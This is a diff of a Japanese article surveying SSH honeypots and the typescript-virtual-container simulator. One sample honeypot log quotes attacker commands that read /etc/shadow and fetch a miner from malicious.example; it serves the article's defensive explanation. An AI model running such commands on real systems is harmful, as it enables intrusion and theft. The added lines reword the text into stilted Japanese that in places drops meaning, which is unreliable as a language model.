+- **シェル層**：偽ファイルシステム（Debian 5.0風）と部分的シェル解釈器でよくある命令に応答する
+- **proxy モード**：後ろの本物 system へ向けられる（高対話モード）。通るもの全部記録する
+- **LLMモード**（最近追加）：扱えない命令へ動的応答を作る言語モデルを使う。そう、Cowrieは今AIモード持ちだ。狂った時代に生きてる。
 
 ```python
-# Cowrieがキャプチャするもの
+# Cowrieが取るもの
 {
   "timestamp": "2024-01-15T03:22:11.847Z",
   "src_ip": "45.33.32.156",
@@ -584,76 +568,76 @@ CowrieはPythonベースの中〜高インタラクションのSSHおよびTelne
 }
 ```
 
-Cowrieはダウンロードされたファイル（wget/curl/SFTP/SCP経由）をマルウェア解析用に保存する。Splunk、Elasticsearch、その他のSIEMプラットフォームと統合する。
+Cowrieは落としたファイル（wgetやcurlやSFTPやSCP経由）をマルウェア分析用に保存する。Splunk、Elasticsearch、他SIEMプラットフォームと統合する。
 
-**忠実度**: 中〜高。自動ボットを騙すには十分（SSH攻撃者の99%はそうだ----ほとんどが`root`/`password`を試すだけの愚かなスクリプトだ）。洗練された人間はフィンガープリントできるが、たいていはすぐにバレる。
+**忠実度**：中高だ。自動ボット騙すに十分説得力ある（SSH攻撃者の99パーセントはこれだ。大半は`root`や`password`を試すただの馬鹿スクリプト）。洗練人間は指紋取りできるけど、ふつうかなり速い。
 
-**言語**: Python（Twisted）  
-**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)
-
----
-
-### 4.2 Kippo -- Cowrieの前身
-
-Kippoはオリジナルの中インタラクションSSHハニーポットで、Cowrieのベースになった。同じ基本アイデア：本物のSSHプロトコル、偽のファイルシステム、部分的なシェル。Cowrieは完全にこれを取って代わった----Kippoはアーカイブされており、2026年に誰も実行すべきではない。古いブログ記事やセキュリティ論文で言及されているのを見かけるかもしれないので、歴史的完全性のためにここに挙げた。
-
-**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- アーカイブ
+**言語**：Python (Twisted)  
+**GitHub**：[cowrie/cowrie](https://github.com/cowrie/cowrie)
 
 ---
 
-### 4.3 endlessh -- SSHターピット
+### 4.2 Kippo。Cowrieの前身
 
-endlesshは退化したハニーポットだ：バナーデータを毎秒1バイト（またはそれ以下）でゆっくりと滴下することで、SSH接続を開いたままにする。接続するSSHクライアントは無期限にハングする----サーバーがバナーの送信を終えないので、認証にすら到達できない。
+KippoはCowrie土台の元祖中対話SSHハニーポットだ。同じ基本発想：本物SSH protocol、偽ファイルシステム、部分的シェルだ。Cowrieが現時点で完全置き換えた。Kippoは保存で2026年に誰も使うべきじゃない。古ブログ記事や安全論文で参照されるかもだから歴史完全用にここに言及するだけだ。
 
-目標は脅威インテリジェンスではなく、純粋なリソース拒否だ：攻撃者のスキャナースレッドを拘束し、実際のターゲットをより速く攻撃できないようにする。正直、最高に邪悪なやり方だ。攻撃者から何かを学ぶのではなく、ただ相手の時間を無駄にする。それには深い満足感がある。
+**GitHub**：[desaster/kippo](https://github.com/desaster/kippo)。保存
+
+---
+
+### 4.3 endlessh。SSH tarpit
+
+endlesshは縮退ハニーポットだ。SSH接続を開いたまま、banner データを1バイト毎秒以下でゆっくり流して保つ。接続するSSHクライアントは無限詰まる。サーバーが banner 送り終えないから認証に絶対届かない。
+
+目標は脅威情報じゃなく純粋資源拒否だ。攻撃者走査スレッドを塞いで本物標的に届くのを遅らせる。正直良い意味でちょっと意地悪だ。攻撃者から何も学ばない。時間を無駄遣いさせるだけだ。そこに深い満足がある。
 
 ```c
-// endlesshのプロトコル動作の全て：
-// 送信："SSH-2.0-OpenSSH_" そしてランダムな文字をゆっくり追加
-// 接続を絶対に閉じない
-// 攻撃者のスキャナーはN秒後にタイムアウト
+// endlesshの全protocol挙動：
+// 送る："SSH-2.0-OpenSSH_" の後にランダム文字ゆっくり追加
+// 接続を絶対閉じない
+// 攻撃者スキャナはN秒後に期限切れ
 ```
 
-コマンドはキャプチャされない。認証はテストされない。単なる接続時間の消費だ。
+命令は取らない。認証は試さない。接続時間だけだ。
 
-**言語**: C  
-**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)
+**書き**：C  
+**GitHub**：[skeeto/endlessh](https://github.com/skeeto/endlessh)
 
 ---
 
-### 4.4 sshesame -- 「全員通せ」ハニーポット
+### 4.4 sshesame。「全員入れろ」ハニーポット
 
-sshesameはすべてのSSH接続を許可し（任意のユーザー名、任意のパスワード、任意のキー）、すべてをログに記録する。ゼロインタラクションのハニーポットだ：コマンドには応答せず、攻撃者を「中に入れる」だけで、タイプするすべてのキーストロークを記録する。
+sshesameは全SSH接続を受け付ける（任意ユーザー、任意パス、任意鍵）。全部記録する。ゼロ対話ハニーポットだ。命令に応答しない。攻撃者を「入れ」て打つ各打鍵を記録するだけだ。
 
 ```
-2024-01-15 03:22:11 Connection from 45.33.32.156
-  Username: root, Password: password123 -- accepted
-  Commands typed:
+2024-01-15 03:22:11 45.33.32.156から接続
+  ユーザー：root、パス：password123 → 受理
+  打った命令：
     cat /etc/shadow
     wget http://malicious.example/miner
     uname -a
-  Disconnected after 47s
+  47秒後に切断
 ```
 
-資格情報の収集に有用：ボットが試すユーザー名とパスワードがすぐに蓄積され、現在どのデフォルト資格情報が活発にブルートフォースされているかがわかる。ネタバレ：いつも`root`/`password`、`admin`/`admin`、`root`/`123456`だ。毎回。
+認証情報収穫に便利だ。ボットが試すユーザー名とパスが速く溜まる。今活発に総当たりされるデフォルト認証情報が分かる。ネタバレ：つねに`root`や`password`、`admin`や`admin`、`root`や`123456`だ。毎回だ。
 
-**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)
-
----
-
-### 4.5 Lyrebird -- Dockerベースのハニーポットフレームワーク
-
-`lyrebird/honeypot-base`は、ネットワークサービスのハニーポットを構築するためのDockerベースイメージだ。特にSSHハニーポットというわけではない----任意のプロトコルのハニーポットを構築するためのフレームワークだ。
-
-ベースイメージはロギングフレームワーク、プロトコル用プラグインシステム、マルチサービスハニーポット用のDocker Composeセットアップを提供する。特定のサービスを偽装するために拡張する。
-
-**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
+**GitHub**：[jaksi/sshesame](https://github.com/jaksi/sshesame)
 
 ---
 
-### 4.6 Node.jsでSSHハニーポットを構築する -- ナイーブな方法とその失敗
+### 4.5 Lyrebird。Docker基準ハニーポット枠組み
 
-`typescript-virtual-container`以前は、Node.jsでSSHハニーポットを構築するには、実際の`ssh2`ライブラリと手動のコマンド偽装を組み合わせる必要があった。非常に面倒で、非常に不完全だ。でも……今や通過儀礼みたいなものだ：
+`lyrebird/honeypot-base`は網サービスハニーポット作りのDocker基準 image だ。特にSSHハニーポットじゃない。任意 protocol ハニーポット作りの枠組みだ。
+
+基準 image は記録枠組み、protocol 用 plugin 制、複数サービスハニーポット用Docker Compose設定を出す。拡張して特定サービスを真似る。
+
+**Docker Hub**：[lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
+
+---
+
+### 4.6 Node.jsでSSHハニーポット作る。素朴法と、なぜ失敗するか
+
+`typescript-virtual-container`前は、Node.jsでSSHハニーポット作るのは本物`ssh2`ライブラリと手動命令真似の組み合わせを意味した。とても面倒で、とても不完全で、でもここは通る儀式だ。
 
 ```js
 import { Server } from "ssh2";
@@ -666,7 +650,7 @@ new Server({ hostKeys: [hostKey] }, client => {
   client.on("authentication", ctx => {
     // 試行を記録
     appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
-    ctx.accept(); // 全員通せ
+    ctx.accept(); // 全員入れる
   });
 
   client.on("ready", () => {
@@ -679,7 +663,7 @@ new Server({ hostKeys: [hostKey] }, client => {
         stream.on("data", data => {
           const cmd = data.toString().trim();
           appendFileSync("commands.log", `${cmd}\n`);
-          // 偽の応答
+          // 応答を真似る
           if (cmd === "uname -a") {
             stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
           } else {
@@ -693,90 +677,90 @@ new Server({ hostKeys: [hostKey] }, client => {
 }).listen(2222);
 ```
 
-これは資格情報とコマンドをキャプチャするという意味で「機能する」。しかし、洗練された攻撃者がちょっと突いた瞬間に明らかに偽物だとわかる。`uname -a`は正しい文字列を返すが、`ls /etc`は「command not found」----これは自白だ。ファイルシステムが存在しない。コマンドはチェーンできない。パイプは機能しない。変数は展開されない。
+認証情報と命令を取る意味で「動く」。でも洗練攻撃者が少し掘れば明らかに偽だ。`uname -a`は正しい文字列を返すのに`ls /etc`は「command not found」だ。罠臭ぷんぷんだ。ファイルシステムはない。命令は繋がらない。管は動かない。変数は expand しない。
 
-熟練した攻撃者は最初の5コマンドであなたのハニーポットをフィンガープリントする。Cowrie的な振る舞いをチェックする自動スクリプトも即座に検出する。どうやらこれが、`typescript-virtual-container`の作者を、コマンドを実際に解釈するものを作る方向に押しやったらしい----詳しくはパート5で。
+有能攻撃者は最初5命令でハニーポットを特定する。Cowrie風挙動を探す自動スクリプトも即検出する。`typescript-virtual-container`作者が本物に命令解釈するものを構築に至らせたのは表向きこれだ。パート5でもっとね。
 
 ---
 
-### ハニーポットファミリーまとめ
+### ハニーポット系統まとめ
 
-| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | ナイーブssh2 |
+| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 素朴ssh2 |
 |---|---|---|---|---|---|---|
-| **インタラクション度** | 中〜高 | 中 | ゼロ | ゼロ | 様々 | 低 |
-| **本物のSSHプロトコル** | ✅ | ✅ | ❌（ターピット） | ✅ | 様々 | ✅ |
-| **シェルの忠実度** | 中 | 中 | n/a | なし | 様々 | 最小限 |
-| **資格情報のキャプチャ** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
-| **コマンドのキャプチャ** | ✅ | ✅ | ❌ | ✅ | 様々 | ✅ |
-| **マルウェアのキャプチャ** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
+| **対話水準** | 中高 | 中 | ゼロ | ゼロ | 可変 | 低 |
+| **本物SSH protocol** | ✅ | ✅ | ❌ (tarpit) | ✅ | 可変 | ✅ |
+| **シェル忠実度** | 中 | 中 | 該当なし | なし | 可変 | 最小 |
+| **認証情報を取る** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
+| **命令を取る** | ✅ | ✅ | ❌ | ✅ | 可変 | ✅ |
+| **マルウェアを取る** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
 | **SIEM統合** | ✅ ネイティブ | ❌ | ❌ | ❌ | ❌ | 手動 |
-| **LLM応答** | ✅（新機能） | ❌ | ❌ | ❌ | ❌ | ❌ |
+| **LLM応答** | ✅（新） | ❌ | ❌ | ❌ | ❌ | ❌ |
 | **言語** | Python | Python | C | Go | Docker | Node.js |
 | **Node.jsネイティブ** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
-| **ステータス** | ✅ 非常に活発 | ⚠️ アーカイブ | ✅ 活発 | ✅ 活発 | ✅ 活発 | DIY |
+| **状態** | ✅ とても活性 | ⚠️ 保存 | ✅ 活性 | ✅ 活性 | ✅ 活性 | DIY |
 
-パターンは明らかだ：より忠実度を求めるほど、より多くのPythonを書く必要がある。真剣にやるならCowrieが明らかな勝者だ----長年戦場で試されてきて、資格情報以上のものをキャプチャする。endlesshとsshesameは本格的な脅威インテルツールというより楽しいサイドプロジェクトだ。ナイーブなNode.jsアプローチは壁にぶつかるまでにせいぜい20%程度しか到達しない。
+模様はここでかなり明確だ。忠実度が欲しいほどPythonを書く。Cowrieは本気なら疑いない勝者だ。現場で年数かけて鍛えられて、単なる認証情報を超えて取る。endlesshとsshesameは真面目脅威情報道具より面白プロジェクトだ。Node.js素朴手法は壁に当たる前に道の20パーセントかもしれない。
 
 ---
 
-## パート5 -- `typescript-virtual-container`：ギャップを埋めるもの
+## パート5。`typescript-virtual-container`：溝を埋めるもの
 
-さて、ここからが面白いところだ。上記の全ファミリーをカタログ化した後、欠落している象限がかなり明らかになる：
+はいここから面白くなる。上系統全部目録した後、空 quadrant はかなり明らかだ。
 
-- JSサンドボックス：コードを分離するが、シェルなし、ファイルシステムなし、SSHなし
-- Linuxエミュレーター：本物のOS、本物のシェル、本物のSSH……でも150+ MB RAM、30秒の起動時間、そしてシリアルI/Oの上に独自APIを構築する必要あり
-- ハニーポット：偽のシェル、プログラム可能なAPIなし、Python/Go/C、Nodeネイティブではない
+- JSサンドボックス：コード隔離、シェルなし、ファイルシステムなし、SSHなし
+- Linuxエミュレータ：本物OS、本物シェル、本物SSH。でもRAM 150MB超、起動30秒、串行I/O上に自前API作らなきゃいけない
+- ハニーポット：偽シェル、プログラム可能APIなし、PythonやGoやC、Nodeネイティブじゃない
 
-完全で、プログラム可能で、NodeネイティブなLinux環境----本物のSSH、本物のパーミッション、本物の仮想ネットワーキング、型付きTypeScript APIを持つもの----を構築した人はいなかった。だから彼女が作った。
+完全でプログラム可能でネイティブNodeなLinux環境で、本物SSH、本物権限、本物仮想網、型付きTypeScript APIのものを誰も作ってなかった。だから彼女は作った。
 
-簡単な紹介：これはこの記事で初めてちゃんと彼女に言及するから：`typescript-virtual-container`は[Chloé Rolzhausen](https://itsrealfortune.fr)によって作られた。フランスの開発者で、オンラインでは**Fortune**（またはItsRealFortune）として知られている。[彼女のウェブサイト](https://itsrealfortune.fr)と[LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//)で見つけられる。プロジェクト全体----56k行のTypeScript、247ファイル、170コマンド----は一人の個人による単独の努力だ。この記事の残りでは彼女をFortuneと呼ぶ。そしてそう、ちょっとすごい。彼女の作品をチェックしてみて！
+小さな紹介。ここで初めて正しく言及するからね。`typescript-virtual-container`は[Chloé Rolzhausen](https://itsrealfortune.fr)が作った。オンラインで**Fortune**（ItsRealFortune）を名乗るフランス開発者だ。[サイト](https://itsrealfortune.fr)と[LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/)で見つけられる。全プロジェクト、56,000行TypeScript、247ファイル、170命令は1人の単独作業だった。残り記事ではFortuneって呼ぶ。うんかなりすごい。仕事見に行って！
 
-### 実際のところ、それは何なのか
+### 実際に何か
 
-`typescript-virtual-container`は**Linux環境シミュレーター**で、純粋なTypeScriptで書かれている。Wasmなし。ネイティブアドオンなし。カーネルなし。247のTypeScriptファイルにわたる約56,000行のソース。
+`typescript-virtual-container`は純TypeScript書きの**Linux環境シミュレータ**だ。Wasmなし、ネイティブ拡張なし、カーネルなしだ。約56,000行ソースが247 TypeScriptファイルに分かれる。
 
-重要な洞察：`ls /etc | grep passwd`を機能させるのにCPUエミュレーターは必要ない。必要なもの：
-1. パス操作に応答するメモリ内ノードのツリー
-2. すべてのアクセスで強制されるPOSIXパーミッションモデル
-3. パイプライン、リダイレクション、サブシェル、変数展開を理解するシェルパーサー
-4. ~170のコマンド実装（関数であってバイナリではない）
-5. ユーザーとグループの管理システム
-6. これらすべてをSSH経由で公開する仕組み
+鍵洞察：`ls /etc | grep passwd`を動かすのにCPUエミュは要らない。要るのはこうだ。
+1. 道演算に応答するメモリ内節木
+2. 各アクセスに適用するPOSIX権限モデル
+3. pipelineもredirectもsubshellも変数 expand も分かるシェル構文解析器
+4. 約170命令実装（関数で、バイナリじゃない）
+5. ユーザーと群管理制
+6. 全部SSH越しに出す何か
 
-これらはすべて、カーネルの関与なしに純粋なTypeScriptで達成可能だ。
+全部カーネル関与なしの純TypeScriptでできる。
 
 ### VirtualFileSystem
 
-VFSは型付きノードのメモリ内ツリー----明示的に`"fs"`永続モードを有効にしない限り、ディスクI/Oはない：
+VFSは型付き節のメモリ内木だ。明示`"fs"`永続モード有効にしない限りディスクI/Oなしだ。
 
 ```ts
-// 簡略化された内部表現
+// 簡略内部表現
 type InternalNode =
   | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
   | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
   | { type: "symlink"; target: string }
   | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
-  | { type: "stub" }; // 遅延ロードされるプレースホルダー
+  | { type: "stub" }; // 遅延読み込み placeholder
 ```
 
-すべてのパス操作は`normalizePath`（`.`、`..`、シンボリックリンクを解決）と`enforceAccess`（要求元のuid/gidに対する読み取り/書き込み/実行パーミッションをチェック）を通過する。`chmod`、`chown`、スティッキービット、setuidはすべて実装されており、実際に強制される。uid 1000のプロセスが、モード0600のroot所有ファイルを読み取ろうとすると、EACCESが返る----偽のEACCESではなく、パーミッションチェックからスローされる本物のJavaScript `Error`だ。その部分はかなりエレガントだと思う。
+各道演算は`normalizePath`（`.`や`..`や symlink 解決）と`enforceAccess`（要求uidやgidに対する読み書き実行権限確認）を通る。`chmod`、`chown`、sticky bit、setuidは全部実装されて本当に適用する。uid 1000で動くプロセスがroot所有モード0600ファイル読もうとしたらEACCESになる。偽EACCESじゃない。権限確認から投げられる本物JavaScript `Error`だ。この部分はかなり優雅だ正直。
 
-VFSは以下の形式にシリアライズされる：
-- `.vfsb` -- コンパクトなバイナリ形式（カスタム、fflate圧縮）----これがデフォルト
-- JSONスナップショット -- 人間が読める、デバッグに便利
-- TARアーカイブ -- 実際のtar形式でのインポート/エクスポート。`tar -xf`すればVFSに……そのファイルが現れる
-- SquashFSイメージ -- 読み取り専用インポート
+VFSはこう直列化する。
+- `.vfsb` → 小さいバイナリ形式（自作、fflate圧縮）。デフォルト形式だ
+- JSON snapshot → 人間可読、デバッグ良し
+- TAR保存 → 本物tar形式 import や export。`tar -xf`すればVFSはただそのファイルを持つ
+- SquashFS image → 読み取り専用 import だ
 
-`"fs"`永続モードでは、クラッシュリカバリ用の書き込み先行ジャーナル（WAL）を維持する----書き込みはまずジャーナルに送られ、フラッシュ時にスナップショットに書き込まれる。Nodeが途中でクラッシュしても、ジャーナルで最後の完全な状態を再構築できる。
+`"fs"`永続モードでは crash 後回復用に先行書き込み log （WAL）を保つ。書き込みはまず日誌へ、flush 時に snapshot へ行く。Nodeが演算途中で死んだら、日誌で最終完全状態を再構築できる。
 
-ディスクI/Oレイテンシをシミュレートする`FileCache`レイヤーもある。`NVME_DISK_IO`や`HDD_DISK_IO`のようなプロファイルを設定すると、VFSがファイル操作を意図的に遅延させ、現実的なタイミングに合わせる。ソフトウェアが自らを遅くしてハードウェアをシミュレートするというのはちょっと面白いが、ベンチマークには非常に便利だ。
+`FileCache`層もあってディスクI/O遅延を真似る。`NVME_DISK_IO`や`HDD_DISK_IO`みたいな profile を設定して、VFSは本物らしい timing に合わせるようファイル演算を人工遅延させる。わざと遅くする software ってかなり笑える。ハード真似るためにね。でも目安測定には本当に便利だ。
 
-### シェルインタプリタ
+### シェル解釈器
 
-シェルパーサーは型付きASTを生成する：
+シェル構文解析器は型付きASTを作る。
 
 ```ts
-// "ls /etc | grep root && echo done" は以下にパースされる：
+// "ls /etc | grep root && echo done" はこう解析される：
 {
   type: "statement",
   pipeline: [
@@ -794,46 +778,46 @@ VFSは以下の形式にシリアライズされる：
 }
 ```
 
-実行エンジンはこのASTを歩く：
-- パイプラインの場合、`{ stdin, stdout, stderr }`ストリームのチェーンを作成し、パイプI/Oで各コマンドを実行
-- 論理演算子（`&&`、`||`）の場合、右側を実行する前に左側の`$?`をチェック
-- サブシェル（`$(...)`、`` ` ` ``）の場合、実行コンテキストをフォーク
-- リダイレクション（`>file`、`>>file`、`2>&1`、`<file`）の場合、実行前にストリーム配線をセットアップ
-- バックグラウンドジョブ（`cmd &`）の場合、完了を待たずに実行
-- 変数の場合、`$VAR`、`${VAR:-default}`、`${#VAR}`、算術`$((expr))`を展開
-- ブレース展開（`{a,b,c}`、`{1..5}`）の場合、実行前に完全な展開リストを生成
+実行器はこのASTを歩く。
+- pipeline用に、`{ stdin, stdout, stderr }`流連鎖を作って各命令を pipeline I/O付きで実行する
+- 論理演算子（`&&`、`||`）用に、右実行前に左の`$?`を確認する
+- sub shell（`$(...)`、`` ` ` ``）用に、実行文脈を分岐する
+- redirect（`>ファイル`、`>>ファイル`、`2>&1`、`<ファイル`）用に、実行前に流配線を設定する
+- 背景仕事（`cmd &`）用に、終わり待たず実行する
+- 変数用に、`$VAR`、`${VAR:-default}`、`${#VAR}`、算術`$((expr))`を expand する
+- 波括弧 expand（`{a,b,c}`、`{1..5}`）用に、実行前に完全 expand 一覧を作る
 
-これらはすべて本物のPOSIXシェル動作だ。パーサーはヒアドキュメント、プロセス置換、グロビング（`*`、`?`、`[abc]`）、引用符処理（シングルクォート、補間付きダブルクォート、バックスラッシュエスケープ）を処理する。完璧ではない----エッジケースは存在する----が、TypeScriptプロジェクトから期待されるものをはるかに超えている。
+全部本物POSIXシェル挙動だ。解析器はheredoc、プロセス置換、glob（`*`、`?`、`[abc]`）、引用管理（単引用、二重引用と補間、円記号 escape）を扱う。完璧じゃない。際どい場合はある。でもTypeScriptプロジェクトの期待を大きく超える。
 
-### ~170の組み込みコマンド
+### 約170内蔵命令
 
-コマンドはコマンドレジストリに登録されたTypeScript関数だ。stdin/stdout/stderrストリーム、VFS、ユーザーセッション、シェル環境、サブモジュールへのアクセスを持つ`CommandContext`を受け取る。
+命令は`CommandContext`を受けるTypeScript関数で命令登録簿に登録する。stdinやstdoutやstderr流、VFS、利用者 session、シェル環境、子 module へのアクセス付きだ。
 
-170のUnixコマンド実装を書くのは……大変だ。簡単なものもある（`echo`、`true`、`false`）、驚くほど複雑なものもある（`awk`、`find`、`tar`）。完全なPOSIX `awk`？TypeScriptで？それは正気の沙汰じゃない。以下が含まれているものの一部：
+170 Unix命令実装を書くのはこうだ。多い。一部は平凡（`echo`、`true`、`false`）、一部は驚くほど複雑（`awk`、`find`、`tar`）だ。つまり完全POSIX `awk`だ。TypeScriptでだ。すごい正直。入ってる抜粋はこうだ。
 
 ```
-cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
-ln, readlink, find, locate, stat, file,
-echo, printf, read, test, [, [[,
-grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
-ps, top, kill, pkill, nice, ionice,
-ssh, scp, sftp (クライアント側、外部接続),
-ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
-apt, apt-get, apt-cache, dpkg, pacman,
-useradd, usermod, userdel, groupadd, passwd, su, sudo,
-tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
-git (スタブ), python3 (スタブ), node (スタブ),
-nano (完全な対話型エディタ), vim (基本), vi (基本),
-neofetch, htop, tree, df, du, free, uptime, who, w, last,
-cron (シミュレート), systemctl (スタブ), journalctl (スタブ),
-...さらに~130以上
+cat、ls、cp、mv、rm、mkdir、rmdir、touch、chmod、chown、chgrp、
+ln、readlink、find、locate、stat、file、
+echo、printf、read、test、[、[[、
+grep、sed、awk、cut、sort、uniq、wc、head、tail、tr、
+ps、top、kill、pkill、nice、ionice、
+ssh、scp、sftp（外向きクライアント側）、
+ping、curl、wget、nc、netstat、ss、ip、ifconfig、route、
+apt、apt-get、apt-cache、dpkg、pacman、
+useradd、usermod、userdel、groupadd、passwd、su、sudo、
+tar、gzip、gunzip、bzip2、bunzip2、xz、unxz、zip、unzip、
+git (stub)、python3 (stub)、node (stub)、
+nano（完全対話編集器）、vim（基本）、vi（基本）、
+neofetch、htop、tree、df、du、free、uptime、who、w、last、
+cron（真似）、systemctl (stub)、journalctl (stub)、
+他約130
 ```
 
-「スタブ」（git、python3、node）は一般的な呼び出しに現実的に応答する----`python3 --version`は信憑性のあるバージョン文字列を返し、`git status`は偽のリポジトリ状態を表示する----実際の作業は行わない。ハニーポットでは、これらは実際のものよりも有用だ。なぜなら、実際に有害なものを実行せずに、攻撃者が何を実行しようとするかを観察できるからだ。
+「stub」（git、python3、node）はよくある呼び出しに現実応答する。`python3 --version`は信用できる版文字列を返す。`git status`は架空リポジトリ状態を示す。本物仕事はしない。ハニーポットには本物命令より実は有用だ。危険なもの何も実行せず攻撃者が何実行しようとしたか観測できるからね。
 
 ### SSHサーバー
 
-SSHレイヤーは実際の`ssh2` npmパッケージを使用する----実際のSSHプロトコル、実際の鍵交換、実際の暗号化。`SSHMimic`がそれをラップする：
+SSH層は本物npm `ssh2`パッケージを使う。本物SSH protocol、本物鍵交換、本物暗号だ。`SSHMimic`が包む。
 
 ```ts
 import { VirtualSshServer } from "typescript-virtual-container";
@@ -848,16 +832,16 @@ const ssh = new VirtualSshServer({
   },
 });
 await ssh.start();
-// 本物のSSH: ssh -p 2222 root@localhost
-// 本物のSFTP: sftp -P 2222 root@localhost
-// 本物のSCP: scp -P 2222 file root@localhost:/tmp/
+// 本物SSH：ssh -p 2222 root@localhost
+// 本物SFTP：sftp -P 2222 root@localhost
+// 本物SCP：scp -P 2222 file root@localhost:/tmp/
 ```
 
-`shellProperties`は`uname -a`、`lsb_release -a`、`neofetch`、`/proc/version`、`/etc/os-release`が報告する内容を決定する。任意のLinuxディストリビューションとカーネルバージョンを説得力を持って偽装できる----実際のSSHクライアントからは、文字通り違いを見分ける方法がない。
+`shellProperties`が`uname -a`や`lsb_release -a`や`neofetch`や`/proc/version`や`/etc/os-release`の報告を決める。任意Linux配布とカーネル版を説得力真似できる。本物SSHクライアントには文字通り違いが分からない。
 
 ### HoneyPotモジュール
 
-シェルインタプリタが本物でSSHサーバーが本物なので、攻撃者のコマンドは仮想環境内で実際に実行される。攻撃者がトリガーした`wget`リクエストは宛先URLとともに記録される。攻撃者が作成したファイルはVFSに保存される。攻撃者の権限昇格の試みは現実的なエラーを生成する。
+シェル解釈器が本物でSSHサーバーが本物だから、攻撃者命令は仮想環境で本当に実行する。攻撃者が起こす`wget`要求は目的地URL付きで記録する。攻撃者が作るファイルはVFSに保存する。攻撃者の権限昇格試行は現実エラーを出す。
 
 ```ts
 import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";
@@ -871,9 +855,9 @@ const pot = new HoneyPot({
 const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
 await ssh.start();
 
-// セッション後、ファイルシステムの差分を取る
+// session 後、ファイルシステムを差分する
 const before = shell.vfs.toSnapshot();
-// ... 攻撃者セッション ...
+// ... 攻撃者 session ...
 const after = shell.vfs.toSnapshot();
 const diff = diffSnapshots(before, after);
 /*
@@ -885,29 +869,29 @@ const diff = diffSnapshots(before, after);
 */
 ```
 
-これはCowrieとは質的に異なる。Cowrieの偽ファイルシステムは`ls`に応答できるが、攻撃者がどのファイルを作成し、どのような変更を構造化された差分として加えたかを実際に追跡することはできない。`typescript-virtual-container`はそれができる。なぜならVFSが生きたデータ構造であり、すべての書き込みが追跡されるからだ。攻撃者が追加したcronエントリ？差分に含まれている。あの`.hidden`フォルダ？差分に含まれている。マルウェア解析にかなり便利だ。
+Cowrieと質的に違う。Cowrie偽ファイルシステムは`ls`に応答できるけど、攻撃者が作ったファイルを追って構造化差分として変化を出すことはできない。`typescript-virtual-container`はできる。VFSが生きデータ構造だからだ。各書き込みが追跡される。攻撃者が足したcronエントリ？差分にある。その`.hidden`フォルダ？差分にある。マルウェア分析にかなり便利だ。
 
-### 仮想ネットワークスタック
+### 仮想網 stack
 
-これはプロジェクト全体でおそらく最も印象的な部分であり、この分野の他のどのプロジェクトにも相当するものがない。完全なL2/L3仮想ネットワークスタックにVPNサポートまで付いて、純粋なTypeScriptで書かれ、実際のネットワークアダプターは関与していない。これは本当にすごい。
+たぶんプロジェクト全体でいちばん印象的な部分で、この領域の他プロジェクトに同等物はない。完全L2やL3仮想網 stack にVPN対応だ。純TypeScript書きで、本物網カード関与なしだ。本当にすごい。
 
-`VirtualNetworkManager`は各`VirtualShell`インスタンスに仮想ネットワークインターフェースを提供し、設定可能なIPアドレス、ルーティングテーブル、ソフトウェアファイアウォール（conntrackとNAT付きiptablesスタイルのルール）を持つ。`ip addr`、`ip route`、`iptables -L`、`netstat -rn`はすべて仮想ネットワーク状態を表示する。
+`VirtualNetworkManager`は各`VirtualShell`インスタンスに設定可能IPアドレス付き仮想網 interface、経路表、 software ファイアウォール（conntrackとNAT付きiptables式規則）を与える。`ip addr`、`ip route`、`iptables -L`、`netstat -rn`は全部仮想網状態を示す。
 
-`VirtualSwitch`（Baieという名前----フランス語でサーバーラックベイ「baie informatique」から）は、複数のシェルを共有サブネット上で接続する。以下を実装：
-- MACラーニングとARP
-- サブネット間のIPルーティング
-- NAT（送信元マスカレード）
-- DNS（サブネットごとに設定可能なレコード）
-- ロードバランシング（ラウンドロビン、最小接続数）
-- トラフィックシェーピング：レイテンシ、ジッター（ガウス分布）、パケットロス、バーストロス、並び替え、重複
-- 帯域幅制限（トークンバケット）
-- MTU強制
-- コネクショントラッキング（ステートフル、NEW/ESTABLISHED/TIME_WAIT状態付き）
+`VirtualSwitch`（Baieって名。サーバー室の仏語「baie informatique」から）が複数シェルを共有 subnet で繋ぐ。実装するのはこうだ。
+- MAC学習とARP
+- subnet 間IP経路
+- NAT（外向き masquerade）
+- DNS（subnet ごと設定可能記録）
+- 負荷分散（round-robin、最少接続）
+-  traffic 整形：遅延、ジッター（正規分布）、packet 損失、burst 損失、並べ替え、複製
+- 帯域上限（token bucket）
+- MTU適用
+- 接続追跡（状態付き、NEWやESTABLISHEDやTIME_WAIT状態）
 
 ```ts
 const baie = new Baie("192.168.0.0/24");
 
-// 同じスイッチ上の3台の仮想マシン
+// 同 switch 上の3仮想マシン
 const web = new VirtualShell("web");
 const api = new VirtualShell("api");
 const db  = new VirtualShell("db");
@@ -916,29 +900,29 @@ baie.attach(web, "192.168.0.2");
 baie.attach(api, "192.168.0.3");
 baie.attach(db,  "192.168.0.4");
 
-// ファイアウォール：webはapiに到達でき、apiはdbに到達できるが、webはdbに直接到達できない
+// ファイアウォール：webはapi到達可、apiはdb到達可、webはdb直接不可
